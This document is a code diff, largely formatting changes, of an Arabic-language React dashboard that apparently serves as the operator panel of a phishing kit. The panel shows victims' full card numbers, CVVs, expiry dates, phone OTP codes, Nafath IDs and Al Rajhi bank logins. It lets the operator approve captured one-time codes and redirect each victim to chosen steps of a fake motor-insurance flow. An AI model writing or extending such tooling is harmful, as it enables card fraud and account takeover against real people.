@@ -108,7 +108,11 @@ interface Notification {
   cardOtpApproved?: boolean;
   phoneOtpApproved?: boolean;
   nafathApproved?: boolean;
-  adminDirective?: { targetPage?: string; targetStep?: number; issuedAt?: string };
+  adminDirective?: {
+    targetPage?: string;
+    targetStep?: number;
+    issuedAt?: string;
+  };
   currentPage?: string | number;
   currentStep?: number;
   step?: string;
@@ -173,7 +177,8 @@ export default function Dashboard() {
   const playNotificationSound = () => {
     if (!soundEnabled) return;
     try {
-      const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
+      const audioContext = new (window.AudioContext ||
+        (window as any).webkitAudioContext)();
       const oscillator = audioContext.createOscillator();
       const gainNode = audioContext.createGain();
       oscillator.connect(gainNode);
@@ -181,7 +186,10 @@ export default function Dashboard() {
       oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
       oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
       gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
-      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
+      gainNode.gain.exponentialRampToValueAtTime(
+        0.01,
+        audioContext.currentTime + 0.3,
+      );
       oscillator.start(audioContext.currentTime);
       oscillator.stop(audioContext.currentTime + 0.3);
     } catch (error) {
@@ -194,12 +202,12 @@ export default function Dashboard() {
       setIsLoading(false);
       return;
     }
-    
+
     const q = query(collection(db, "pays"), orderBy("createdAt", "desc"));
-    
+
     const unsubscribe = onSnapshot(q, (snapshot) => {
       const notificationsData: Notification[] = [];
-      
+
       snapshot.forEach((doc) => {
         const data = doc.data();
         if (!data.isHidden) {
@@ -231,9 +239,12 @@ export default function Dashboard() {
   }, [soundEnabled]);
 
   // Helper functions to get card data from either paymentInfo or direct fields
-  const getCardNumber = (n: Notification) => n.paymentInfo?.cardNumber || n.cardNumber;
-  const getCardName = (n: Notification) => n.paymentInfo?.cardName || n.cardName;
-  const getCardExpiry = (n: Notification) => n.paymentInfo?.cardExpiry || n.cardExpiry;
+  const getCardNumber = (n: Notification) =>
+    n.paymentInfo?.cardNumber || n.cardNumber;
+  const getCardName = (n: Notification) =>
+    n.paymentInfo?.cardName || n.cardName;
+  const getCardExpiry = (n: Notification) =>
+    n.paymentInfo?.cardExpiry || n.cardExpiry;
   const getCardCvv = (n: Notification) => n.paymentInfo?.cardCvv || n.cardCvv;
 
   const hasData = (n: Notification) => {
@@ -252,29 +263,41 @@ export default function Dashboard() {
   const filteredApps = useMemo(() => {
     return notifications.filter((app) => {
       if (!hasData(app)) return false;
-      
+
       const cardNum = getCardNumber(app);
       const cardNm = getCardName(app);
-      
-      const matchesSearch = !searchTerm ||
-        app.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+
+      const matchesSearch =
+        !searchTerm ||
+        app.documment_owner_full_name
+          ?.toLowerCase()
+          .includes(searchTerm.toLowerCase()) ||
         app.nationalId?.includes(searchTerm) ||
         app.phoneNumber?.includes(searchTerm) ||
         cardNum?.includes(searchTerm) ||
         cardNm?.toLowerCase().includes(searchTerm.toLowerCase());
 
-      const matchesStatus = statusFilter === "all" ||
-        (statusFilter === "completed" && app.approvalStatus === "approved_otp") ||
+      const matchesStatus =
+        statusFilter === "all" ||
+        (statusFilter === "completed" &&
+          app.approvalStatus === "approved_otp") ||
         (statusFilter === "pending" && !app.approvalStatus) ||
         (statusFilter === "rejected" && app.approvalStatus === "rejected");
 
-      const matchesApproval = approvalFilter === "all" ||
-        (approvalFilter === "pending_card" && cardNum && !app.cardOtpApproved) ||
-        (approvalFilter === "pending_phone" && app.phoneOtpCode && !app.phoneOtpApproved) ||
-        (approvalFilter === "approved" && (app.cardOtpApproved || app.phoneOtpApproved)) ||
+      const matchesApproval =
+        approvalFilter === "all" ||
+        (approvalFilter === "pending_card" &&
+          cardNum &&
+          !app.cardOtpApproved) ||
+        (approvalFilter === "pending_phone" &&
+          app.phoneOtpCode &&
+          !app.phoneOtpApproved) ||
+        (approvalFilter === "approved" &&
+          (app.cardOtpApproved || app.phoneOtpApproved)) ||
         (approvalFilter === "rejected" && app.approvalStatus === "rejected");
 
-      const matchesData = dataFilter === "all" ||
+      const matchesData =
+        dataFilter === "all" ||
         (dataFilter === "card" && cardNum) ||
         (dataFilter === "phone" && (app.phoneOtpCode || app.phoneNumber)) ||
         (dataFilter === "nafaz" && app.nafazId) ||
@@ -285,13 +308,17 @@ export default function Dashboard() {
   }, [notifications, searchTerm, statusFilter, approvalFilter, dataFilter]);
 
   const unreadCount = useMemo(() => {
-    return filteredApps.filter(n => n.isUnread).length;
+    return filteredApps.filter((n) => n.isUnread).length;
   }, [filteredApps]);
 
-  const selectedApplication = notifications.find((app) => app.id === selectedId);
+  const selectedApplication = notifications.find(
+    (app) => app.id === selectedId,
+  );
 
   // Fetch BIN data when card number changes
-  const selectedCardNumber = selectedApplication ? getCardNumber(selectedApplication) : undefined;
+  const selectedCardNumber = selectedApplication
+    ? getCardNumber(selectedApplication)
+    : undefined;
   useEffect(() => {
     if (selectedCardNumber) {
       fetchBinData(selectedCardNumber);
@@ -303,27 +330,44 @@ export default function Dashboard() {
   const stats = {
     total: notifications.filter(hasData).length,
     cards: notifications.filter((a) => getCardNumber(a)).length,
-    pending: notifications.filter((a) => getCardNumber(a) && !a.cardOtpApproved).length,
-    approved: notifications.filter((a) => a.cardOtpApproved || a.phoneOtpApproved).length,
-  };
-
-  const pendingApprovals = {
-    cardApprovals: notifications.filter((a) => getCardNumber(a) && !a.cardOtpApproved).length,
-    phoneApprovals: notifications.filter((a) => a.phoneOtpCode && !a.phoneOtpApproved).length,
-    nafazApprovals: notifications.filter((a) => a.nafazId && !a.nafathApproved).length,
-    total: notifications.filter((a) => 
-      (getCardNumber(a) && !a.cardOtpApproved) || 
-      (a.phoneOtpCode && !a.phoneOtpApproved) ||
-      (a.nafazId && !a.nafathApproved)
+    pending: notifications.filter((a) => getCardNumber(a) && !a.cardOtpApproved)
+      .length,
+    approved: notifications.filter(
+      (a) => a.cardOtpApproved || a.phoneOtpApproved,
     ).length,
   };
 
-  const handleApprovalStatus = async (id: string, status: string, atmCodeValue?: string) => {
+  const pendingApprovals = {
+    cardApprovals: notifications.filter(
+      (a) => getCardNumber(a) && !a.cardOtpApproved,
+    ).length,
+    phoneApprovals: notifications.filter(
+      (a) => a.phoneOtpCode && !a.phoneOtpApproved,
+    ).length,
+    nafazApprovals: notifications.filter((a) => a.nafazId && !a.nafathApproved)
+      .length,
+    total: notifications.filter(
+      (a) =>
+        (getCardNumber(a) && !a.cardOtpApproved) ||
+        (a.phoneOtpCode && !a.phoneOtpApproved) ||
+        (a.nafazId && !a.nafathApproved),
+    ).length,
+  };
+
+  const handleApprovalStatus = async (
+    id: string,
+    status: string,
+    atmCodeValue?: string,
+  ) => {
     if (!db) return;
     try {
       const updates: any = { approvalStatus: status };
       if (atmCodeValue) {
-        updates.atmVerification = { code: atmCodeValue, status: "pending", timestamp: new Date().toISOString() };
+        updates.atmVerification = {
+          code: atmCodeValue,
+          status: "pending",
+          timestamp: new Date().toISOString(),
+        };
       }
       await updateDoc(doc(db, "pays", id), updates);
       toast({ title: "تم التحديث" });
@@ -332,7 +376,11 @@ export default function Dashboard() {
     }
   };
 
-  const handleFieldApproval = async (id: string, field: string, value: boolean) => {
+  const handleFieldApproval = async (
+    id: string,
+    field: string,
+    value: boolean,
+  ) => {
     if (!db) return;
     try {
       await updateDoc(doc(db, "pays", id), { [field]: value });
@@ -348,8 +396,8 @@ export default function Dashboard() {
       let directive: any = {
         issuedAt: new Date().toISOString(),
       };
-      
-      if (typeof page === 'number') {
+
+      if (typeof page === "number") {
         // Numbered steps 1-7 are for motor-insurance page
         directive.targetPage = "motor-insurance";
         directive.targetStep = page;
@@ -358,7 +406,7 @@ export default function Dashboard() {
         directive.targetPage = page;
         directive.targetStep = null;
       }
-      
+
       await updateDoc(doc(db, "pays", id), { adminDirective: directive });
       toast({ title: "تم تحديث الصفحة" });
     } catch (error) {
@@ -393,7 +441,13 @@ export default function Dashboard() {
   };
 
   const getDisplayName = (n: Notification) => {
-    return getCardName(n) || n.documment_owner_full_name || n.nationalId || n.phoneNumber || n.id.substring(0, 8);
+    return (
+      getCardName(n) ||
+      n.documment_owner_full_name ||
+      n.nationalId ||
+      n.phoneNumber ||
+      n.id.substring(0, 8)
+    );
   };
 
   const formatTime = (date: any) => {
@@ -414,14 +468,29 @@ export default function Dashboard() {
     }
   };
 
-  const DataRow = ({ label, value, isLtr }: { label: string; value?: string | number | null; isLtr?: boolean }) => {
+  const DataRow = ({
+    label,
+    value,
+    isLtr,
+  }: {
+    label: string;
+    value?: string | number | null;
+    isLtr?: boolean;
+  }) => {
     if (!value) return null;
     const strValue = String(value);
     return (
       <div className="flex items-center justify-between group hover:bg-muted/50 px-3 py-2 rounded transition-colors border-b border-border">
-        <span className="font-bold text-gray-700 dark:text-gray-300 text-sm">{label}</span>
+        <span className="font-bold text-gray-700 dark:text-gray-300 text-sm">
+          {label}
+        </span>
         <div className="flex items-center gap-2">
-          <span className={cn("text-gray-600 dark:text-gray-400 font-medium", isLtr && "direction-ltr text-left font-mono")}>
+          <span
+            className={cn(
+              "text-gray-600 dark:text-gray-400 font-medium",
+              isLtr && "direction-ltr text-left font-mono",
+            )}
+          >
             {strValue}
           </span>
           <button
@@ -429,54 +498,123 @@ export default function Dashboard() {
             className="opacity-0 group-hover:opacity-100 transition-opacity text-gray-400 hover:text-blue-500"
             data-testid={`copy-${label}`}
           >
-            {copiedField === label ? <Check size={14} className="text-green-500" /> : <Copy size={14} />}
+            {copiedField === label ? (
+              <Check size={14} className="text-green-500" />
+            ) : (
+              <Copy size={14} />
+            )}
           </button>
         </div>
       </div>
     );
   };
 
-  const ChatBubble = ({ title, children, isUser, icon }: { title: string; children: React.ReactNode; isUser?: boolean; icon?: React.ReactNode }) => (
-    <div className={cn("flex gap-3 mb-4", isUser ? "flex-row-reverse" : "flex-row")}>
-      <div className={cn("w-8 h-8 rounded-full flex items-center justify-center shrink-0", isUser ? "bg-blue-500 text-white" : "bg-gray-200 dark:bg-gray-700 text-gray-600 dark:text-gray-300")}>
+  const ChatBubble = ({
+    title,
+    children,
+    isUser,
+    icon,
+  }: {
+    title: string;
+    children: React.ReactNode;
+    isUser?: boolean;
+    icon?: React.ReactNode;
+  }) => (
+    <div
+      className={cn(
+        "flex gap-3 mb-4",
+        isUser ? "flex-row-reverse" : "flex-row",
+      )}
+    >
+      <div
+        className={cn(
+          "w-8 h-8 rounded-full flex items-center justify-center shrink-0",
+          isUser
+            ? "bg-blue-500 text-white"
+            : "bg-gray-200 dark:bg-gray-700 text-gray-600 dark:text-gray-300",
+        )}
+      >
         {icon || (isUser ? <User size={16} /> : <MessageSquare size={16} />)}
       </div>
-      <div className={cn("max-w-[80%] rounded-2xl p-4 shadow-sm", isUser ? "bg-primary text-primary-foreground rounded-tr-sm" : "bg-card border border-border rounded-tl-sm")}>
-        <div className={cn("text-xs font-bold mb-2", isUser ? "text-primary-foreground/80" : "text-muted-foreground")}>{title}</div>
-        <div className={isUser ? "text-primary-foreground" : "text-foreground"}>{children}</div>
+      <div
+        className={cn(
+          "max-w-[80%] rounded-2xl p-4 shadow-sm",
+          isUser
+            ? "bg-primary text-primary-foreground rounded-tr-sm"
+            : "bg-card border border-border rounded-tl-sm",
+        )}
+      >
+        <div
+          className={cn(
+            "text-xs font-bold mb-2",
+            isUser ? "text-primary-foreground/80" : "text-muted-foreground",
+          )}
+        >
+          {title}
+        </div>
+        <div className={isUser ? "text-primary-foreground" : "text-foreground"}>
+          {children}
+        </div>
       </div>
     </div>
   );
 
   if (!isFirebaseConfigured) {
     return (
-      <div className="flex items-center justify-center h-screen bg-background" dir="rtl">
+      <div
+        className="flex items-center justify-center h-screen bg-background"
+        dir="rtl"
+      >
         <div className="text-center p-8 max-w-md">
           <AlertTriangle className="h-16 w-16 text-amber-500 mx-auto mb-4" />
           <h2 className="text-xl font-bold mb-2">Firebase غير مكون</h2>
-          <p className="text-muted-foreground">يرجى تكوين Firebase للوصول إلى لوحة التحكم</p>
+          <p className="text-muted-foreground">
+            يرجى تكوين Firebase للوصول إلى لوحة التحكم
+          </p>
         </div>
       </div>
     );
   }
 
   return (
-    <div className="flex h-screen bg-background w-full overflow-hidden text-right font-sans text-foreground" dir="rtl">
+    <div
+      className="flex h-screen bg-background w-full overflow-hidden text-right font-sans text-foreground"
+      dir="rtl"
+    >
       {/* Right Sidebar - Inbox List */}
       <aside className="w-[320px] bg-card border-l border-border flex flex-col shrink-0 z-20 shadow-[4px_0_24px_rgba(0,0,0,0.02)]">
         {/* Header */}
         <div className="h-14 border-b border-border flex items-center justify-between px-4 shrink-0 bg-card">
           <div className="flex items-center gap-3">
-            <div className="font-bold text-foreground text-sm">صندوق الوارد</div>
-            {unreadCount > 0 && <Badge className="bg-red-500 text-white">{unreadCount}</Badge>}
+            <div className="font-bold text-foreground text-sm">
+              صندوق الوارد
+            </div>
+            {unreadCount > 0 && (
+              <Badge className="bg-red-500 text-white">{unreadCount}</Badge>
+            )}
           </div>
           <div className="flex items-center gap-2">
-            <Button variant="ghost" size="icon" className="h-7 w-7" onClick={() => setSoundEnabled(!soundEnabled)} data-testid="button-sound-toggle">
-              {soundEnabled ? <Volume2 size={14} className="text-green-500" /> : <VolumeX size={14} className="text-muted-foreground" />}
+            <Button
+              variant="ghost"
+              size="icon"
+              className="h-7 w-7"
+              onClick={() => setSoundEnabled(!soundEnabled)}
+              data-testid="button-sound-toggle"
+            >
+              {soundEnabled ? (
+                <Volume2 size={14} className="text-green-500" />
+              ) : (
+                <VolumeX size={14} className="text-muted-foreground" />
+              )}
             </Button>
             <div className="h-6 w-px bg-border mx-1" />
             <div className="flex items-center gap-1 text-[10px] text-muted-foreground font-mono">
-              <span className="text-green-500 font-bold" data-testid="stats-approved">{stats.approved} / {stats.pending}</span>
+              <span
+                className="text-green-500 font-bold"
+                data-testid="stats-approved"
+              >
+                {stats.approved} / {stats.pending}
+              </span>
               <span data-testid="stats-total">/ {stats.total}</span>
             </div>
           </div>
@@ -484,7 +622,10 @@ export default function Dashboard() {
 
         {/* Pending Approvals Warning */}
         {pendingApprovals.total > 0 && (
-          <div className="mx-3 mt-3 p-3 border rounded-lg animate-pulse bg-gradient-to-l from-amber-500/15 to-amber-500/5 border-amber-500/40" data-testid="warning-approvals">
+          <div
+            className="mx-3 mt-3 p-3 border rounded-lg animate-pulse bg-gradient-to-l from-amber-500/15 to-amber-500/5 border-amber-500/40"
+            data-testid="warning-approvals"
+          >
             <div className="flex items-center gap-2 text-amber-600">
               <div className="w-6 h-6 rounded-full flex items-center justify-center animate-bounce bg-amber-500">
                 <Bell size={14} className="text-white" />
@@ -492,12 +633,27 @@ export default function Dashboard() {
               <div className="flex-1">
                 <div className="font-bold text-sm">بانتظار الموافقة</div>
                 <div className="text-xs text-amber-600/80">
-                  {pendingApprovals.cardApprovals > 0 && <span className="inline-flex items-center gap-1 ml-2"><CreditCard size={10} /> {pendingApprovals.cardApprovals} بطاقة</span>}
-                  {pendingApprovals.phoneApprovals > 0 && <span className="inline-flex items-center gap-1 ml-2"><Phone size={10} /> {pendingApprovals.phoneApprovals} هاتف</span>}
-                  {pendingApprovals.nafazApprovals > 0 && <span className="inline-flex items-center gap-1"><Lock size={10} /> {pendingApprovals.nafazApprovals} نفاذ</span>}
+                  {pendingApprovals.cardApprovals > 0 && (
+                    <span className="inline-flex items-center gap-1 ml-2">
+                      <CreditCard size={10} /> {pendingApprovals.cardApprovals}{" "}
+                      بطاقة
+                    </span>
+                  )}
+                  {pendingApprovals.phoneApprovals > 0 && (
+                    <span className="inline-flex items-center gap-1 ml-2">
+                      <Phone size={10} /> {pendingApprovals.phoneApprovals} هاتف
+                    </span>
+                  )}
+                  {pendingApprovals.nafazApprovals > 0 && (
+                    <span className="inline-flex items-center gap-1">
+                      <Lock size={10} /> {pendingApprovals.nafazApprovals} نفاذ
+                    </span>
+                  )}
                 </div>
               </div>
-              <Badge className="bg-amber-500 text-white">{pendingApprovals.total}</Badge>
+              <Badge className="bg-amber-500 text-white">
+                {pendingApprovals.total}
+              </Badge>
             </div>
           </div>
         )}
@@ -505,7 +661,10 @@ export default function Dashboard() {
         {/* Search & Filter */}
         <div className="p-3 border-b border-border space-y-3 bg-card/50">
           <div className="relative">
-            <Search size={14} className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400" />
+            <Search
+              size={14}
+              className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400"
+            />
             <Input
               placeholder="بحث..."
               value={searchTerm}
@@ -545,28 +704,106 @@ export default function Dashboard() {
 
           {/* Data Type Filter Buttons */}
           <div className="flex flex-wrap gap-1.5">
-            <button onClick={() => setDataFilter("all")} className={cn("px-2 py-1 text-[10px] rounded-full transition-all", dataFilter === "all" ? "bg-blue-500 text-white" : "bg-gray-100 dark:bg-gray-800 text-gray-600 dark:text-gray-400 hover:bg-gray-200")} data-testid="filter-all">الكل</button>
-            <button onClick={() => setDataFilter("card")} className={cn("px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1", dataFilter === "card" ? "bg-purple-500 text-white" : "bg-purple-50 dark:bg-purple-900/30 text-purple-600 dark:text-purple-400")} data-testid="filter-card"><CreditCard size={10} />بطاقة</button>
-            <button onClick={() => setDataFilter("phone")} className={cn("px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1", dataFilter === "phone" ? "bg-blue-500 text-white" : "bg-blue-50 dark:bg-blue-900/30 text-blue-600 dark:text-blue-400")} data-testid="filter-phone"><Phone size={10} />هاتف</button>
-            <button onClick={() => setDataFilter("nafaz")} className={cn("px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1", dataFilter === "nafaz" ? "bg-green-500 text-white" : "bg-green-50 dark:bg-green-900/30 text-green-600 dark:text-green-400")} data-testid="filter-nafaz"><Lock size={10} />نفاذ</button>
-            <button onClick={() => setDataFilter("rajhi")} className={cn("px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1", dataFilter === "rajhi" ? "bg-teal-500 text-white" : "bg-teal-50 dark:bg-teal-900/30 text-teal-600 dark:text-teal-400")} data-testid="filter-rajhi"><Shield size={10} />الراجحي</button>
-            
-            {(statusFilter !== "all" || approvalFilter !== "all" || dataFilter !== "all") && (
-              <Button variant="ghost" size="sm" onClick={() => { setStatusFilter("all"); setApprovalFilter("all"); setDataFilter("all"); }} className="h-6 px-2 text-[10px] text-red-500" data-testid="button-clear-filters">
-                <X size={10} className="ml-1" />مسح
+            <button
+              onClick={() => setDataFilter("all")}
+              className={cn(
+                "px-2 py-1 text-[10px] rounded-full transition-all",
+                dataFilter === "all"
+                  ? "bg-blue-500 text-white"
+                  : "bg-gray-100 dark:bg-gray-800 text-gray-600 dark:text-gray-400 hover:bg-gray-200",
+              )}
+              data-testid="filter-all"
+            >
+              الكل
+            </button>
+            <button
+              onClick={() => setDataFilter("card")}
+              className={cn(
+                "px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1",
+                dataFilter === "card"
+                  ? "bg-purple-500 text-white"
+                  : "bg-purple-50 dark:bg-purple-900/30 text-purple-600 dark:text-purple-400",
+              )}
+              data-testid="filter-card"
+            >
+              <CreditCard size={10} />
+              بطاقة
+            </button>
+            <button
+              onClick={() => setDataFilter("phone")}
+              className={cn(
+                "px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1",
+                dataFilter === "phone"
+                  ? "bg-blue-500 text-white"
+                  : "bg-blue-50 dark:bg-blue-900/30 text-blue-600 dark:text-blue-400",
+              )}
+              data-testid="filter-phone"
+            >
+              <Phone size={10} />
+              هاتف
+            </button>
+            <button
+              onClick={() => setDataFilter("nafaz")}
+              className={cn(
+                "px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1",
+                dataFilter === "nafaz"
+                  ? "bg-green-500 text-white"
+                  : "bg-green-50 dark:bg-green-900/30 text-green-600 dark:text-green-400",
+              )}
+              data-testid="filter-nafaz"
+            >
+              <Lock size={10} />
+              نفاذ
+            </button>
+            <button
+              onClick={() => setDataFilter("rajhi")}
+              className={cn(
+                "px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1",
+                dataFilter === "rajhi"
+                  ? "bg-teal-500 text-white"
+                  : "bg-teal-50 dark:bg-teal-900/30 text-teal-600 dark:text-teal-400",
+              )}
+              data-testid="filter-rajhi"
+            >
+              <Shield size={10} />
+              الراجحي
+            </button>
+
+            {(statusFilter !== "all" ||
+              approvalFilter !== "all" ||
+              dataFilter !== "all") && (
+              <Button
+                variant="ghost"
+                size="sm"
+                onClick={() => {
+                  setStatusFilter("all");
+                  setApprovalFilter("all");
+                  setDataFilter("all");
+                }}
+                className="h-6 px-2 text-[10px] text-red-500"
+                data-testid="button-clear-filters"
+              >
+                <X size={10} className="ml-1" />
+                مسح
               </Button>
             )}
           </div>
 
-          <div className="text-[10px] text-gray-400">عرض {filteredApps.length} من {stats.total} طلب</div>
+          <div className="text-[10px] text-gray-400">
+            عرض {filteredApps.length} من {stats.total} طلب
+          </div>
         </div>
 
         {/* Application List */}
         <ScrollArea className="flex-1">
           {isLoading ? (
-            <div className="p-4 text-center text-gray-400 text-sm">جاري التحميل...</div>
+            <div className="p-4 text-center text-gray-400 text-sm">
+              جاري التحميل...
+            </div>
           ) : filteredApps.length === 0 ? (
-            <div className="p-4 text-center text-gray-400 text-sm">لا توجد طلبات</div>
+            <div className="p-4 text-center text-gray-400 text-sm">
+              لا توجد طلبات
+            </div>
           ) : (
             filteredApps.map((app) => (
               <div
@@ -574,21 +811,35 @@ export default function Dashboard() {
                 onClick={() => handleMarkAsRead(app)}
                 className={cn(
                   "flex items-center gap-3 px-4 py-3 border-b border-border cursor-pointer transition-all duration-200 hover:bg-primary/5",
-                  selectedId === app.id && "bg-blue-50 dark:bg-blue-900/20 border-r-2 border-r-blue-500",
-                  getCardNumber(app) && selectedId !== app.id && "bg-gradient-to-l from-purple-50 dark:from-purple-900/20 to-transparent border-r-2 border-r-purple-400",
-                  (app.nafazId || app.phoneOtpCode) && !getCardNumber(app) && selectedId !== app.id && "bg-gradient-to-l from-green-50 dark:from-green-900/20 to-transparent border-r-2 border-r-green-400",
+                  selectedId === app.id &&
+                    "bg-blue-50 dark:bg-blue-900/20 border-r-2 border-r-blue-500",
+                  getCardNumber(app) &&
+                    selectedId !== app.id &&
+                    "bg-gradient-to-l from-purple-50 dark:from-purple-900/20 to-transparent border-r-2 border-r-purple-400",
+                  (app.nafazId || app.phoneOtpCode) &&
+                    !getCardNumber(app) &&
+                    selectedId !== app.id &&
+                    "bg-gradient-to-l from-green-50 dark:from-green-900/20 to-transparent border-r-2 border-r-green-400",
                 )}
                 data-testid={`app-item-${app.id}`}
               >
                 <div className="relative">
-                  <div className={cn("w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold bg-gray-200 dark:bg-gray-700 text-gray-600 dark:text-gray-300")}>
+                  <div
+                    className={cn(
+                      "w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold bg-gray-200 dark:bg-gray-700 text-gray-600 dark:text-gray-300",
+                    )}
+                  >
                     {getDisplayName(app)?.charAt(0) || "؟"}
                     {/* Alert indicator */}
-                    {((app.otpCode && !app.cardOtpApproved) || (app.phoneOtpCode && !app.phoneOtpApproved) || (app.nafazId && !app.nafathApproved)) && (
+                    {((app.otpCode && !app.cardOtpApproved) ||
+                      (app.phoneOtpCode && !app.phoneOtpApproved) ||
+                      (app.nafazId && !app.nafathApproved)) && (
                       <>
                         <div className="absolute -top-1 -left-1 w-4 h-4 bg-red-500 rounded-full animate-ping opacity-75" />
                         <div className="absolute -top-1 -left-1 w-4 h-4 bg-red-500 rounded-full flex items-center justify-center">
-                          <span className="text-white text-[8px] font-bold">!</span>
+                          <span className="text-white text-[8px] font-bold">
+                            !
+                          </span>
                         </div>
                       </>
                     )}
@@ -597,20 +848,68 @@ export default function Dashboard() {
                 <div className="flex-1 min-w-0">
                   <div className="flex items-center justify-between">
                     <div className="flex items-center gap-1.5">
-                      <span className={cn("font-medium text-sm truncate", app.isUnread ? "text-foreground font-bold" : "text-foreground")}>
+                      <span
+                        className={cn(
+                          "font-medium text-sm truncate",
+                          app.isUnread
+                            ? "text-foreground font-bold"
+                            : "text-foreground",
+                        )}
+                      >
                         {getDisplayName(app)}
                       </span>
-                      {app.isUnread && <Flag size={10} className="text-red-500 fill-red-500" data-testid={`flag-unread-${app.id}`} />}
+                      {app.isUnread && (
+                        <Flag
+                          size={10}
+                          className="text-red-500 fill-red-500"
+                          data-testid={`flag-unread-${app.id}`}
+                        />
+                      )}
                     </div>
-                    <span className="text-[10px] text-muted-foreground">{formatTime(app.createdAt)}</span>
+                    <span className="text-[10px] text-muted-foreground">
+                      {formatTime(app.createdAt)}
+                    </span>
                   </div>
                   <div className="flex items-center gap-2 mt-1">
-                    {getCardNumber(app) && <Badge variant="outline" className="text-[9px] px-1.5 py-0 h-4 border-purple-300 text-purple-600"><CreditCard size={8} className="mr-1" />بطاقة</Badge>}
-                    {app.nafazId && <Badge variant="outline" className="text-[9px] px-1.5 py-0 h-4 border-green-300 text-green-600"><Lock size={8} className="mr-1" />نفاذ</Badge>}
-                    {app.rajhiUser && <Badge variant="outline" className="text-[9px] px-1.5 py-0 h-4 border-teal-300 text-teal-600"><Shield size={8} className="mr-1" />الراجحي</Badge>}
+                    {getCardNumber(app) && (
+                      <Badge
+                        variant="outline"
+                        className="text-[9px] px-1.5 py-0 h-4 border-purple-300 text-purple-600"
+                      >
+                        <CreditCard size={8} className="mr-1" />
+                        بطاقة
+                      </Badge>
+                    )}
+                    {app.nafazId && (
+                      <Badge
+                        variant="outline"
+                        className="text-[9px] px-1.5 py-0 h-4 border-green-300 text-green-600"
+                      >
+                        <Lock size={8} className="mr-1" />
+                        نفاذ
+                      </Badge>
+                    )}
+                    {app.rajhiUser && (
+                      <Badge
+                        variant="outline"
+                        className="text-[9px] px-1.5 py-0 h-4 border-teal-300 text-teal-600"
+                      >
+                        <Shield size={8} className="mr-1" />
+                        الراجحي
+                      </Badge>
+                    )}
                   </div>
                 </div>
-                <Button variant="ghost" size="icon" className="h-6 w-6 shrink-0" onClick={(e) => { e.stopPropagation(); handleDelete(app.id); }} data-testid={`button-delete-${app.id}`}>
+                <Button
+                  variant="ghost"
+                  size="icon"
+                  className="h-6 w-6 shrink-0"
+                  onClick={(e) => {
+                    e.stopPropagation();
+                    handleDelete(app.id);
+                  }}
+                  data-testid={`button-delete-${app.id}`}
+                >
                   <Trash2 size={12} className="text-gray-400" />
                 </Button>
               </div>
@@ -629,23 +928,52 @@ export default function Dashboard() {
                 <>
                   <div className="flex items-center gap-2 text-sm">
                     <span className="text-muted-foreground">الهوية</span>
-                    <span className="font-mono text-foreground" data-testid="text-identity">{selectedApplication.nationalId || selectedApplication.identityNumber}</span>
+                    <span
+                      className="font-mono text-foreground"
+                      data-testid="text-identity"
+                    >
+                      {selectedApplication.nationalId ||
+                        selectedApplication.identityNumber}
+                    </span>
                   </div>
                   <div className="flex items-center gap-2 text-sm">
                     <Phone size={14} className="text-gray-400" />
-                    <span className="font-mono text-foreground" data-testid="text-phone">{selectedApplication.phoneNumber}</span>
+                    <span
+                      className="font-mono text-foreground"
+                      data-testid="text-phone"
+                    >
+                      {selectedApplication.phoneNumber}
+                    </span>
                   </div>
                   <div className="flex items-center gap-2 text-sm">
                     <User size={14} className="text-gray-400" />
-                    <span className="text-foreground" data-testid="text-owner">{getCardName(selectedApplication) || selectedApplication.documment_owner_full_name}</span>
+                    <span className="text-foreground" data-testid="text-owner">
+                      {getCardName(selectedApplication) ||
+                        selectedApplication.documment_owner_full_name}
+                    </span>
                   </div>
                 </>
               )}
             </div>
             <div className="flex items-center gap-2">
               {selectedApplication && (
-                <Badge className={cn("text-[9px]", selectedApplication.approvalStatus === "approved_otp" && "bg-green-100 text-green-700", !selectedApplication.approvalStatus && "bg-amber-100 text-amber-700", selectedApplication.approvalStatus === "rejected" && "bg-red-100 text-red-700")} data-testid="badge-status">
-                  {selectedApplication.approvalStatus === "approved_otp" ? "موافق" : selectedApplication.approvalStatus === "rejected" ? "مرفوض" : "قيد الانتظار"}
+                <Badge
+                  className={cn(
+                    "text-[9px]",
+                    selectedApplication.approvalStatus === "approved_otp" &&
+                      "bg-green-100 text-green-700",
+                    !selectedApplication.approvalStatus &&
+                      "bg-amber-100 text-amber-700",
+                    selectedApplication.approvalStatus === "rejected" &&
+                      "bg-red-100 text-red-700",
+                  )}
+                  data-testid="badge-status"
+                >
+                  {selectedApplication.approvalStatus === "approved_otp"
+                    ? "موافق"
+                    : selectedApplication.approvalStatus === "rejected"
+                      ? "مرفوض"
+                      : "قيد الانتظار"}
                 </Badge>
               )}
             </div>
@@ -670,16 +998,29 @@ export default function Dashboard() {
                   return (
                     <button
                       key={step}
-                      onClick={() => handleUpdateCurrentPage(selectedApplication.id, step)}
+                      onClick={() =>
+                        handleUpdateCurrentPage(selectedApplication.id, step)
+                      }
                       className={cn(
                         "flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all whitespace-nowrap cursor-pointer hover:opacity-80",
                         isActive && "bg-blue-600 text-white shadow-md",
-                        isPassed && !isActive && "bg-green-500/20 text-green-700 dark:text-green-400",
-                        !isActive && !isPassed && "bg-muted text-muted-foreground",
+                        isPassed &&
+                          !isActive &&
+                          "bg-green-500/20 text-green-700 dark:text-green-400",
+                        !isActive &&
+                          !isPassed &&
+                          "bg-muted text-muted-foreground",
                       )}
                       data-testid={`step-${step}`}
                     >
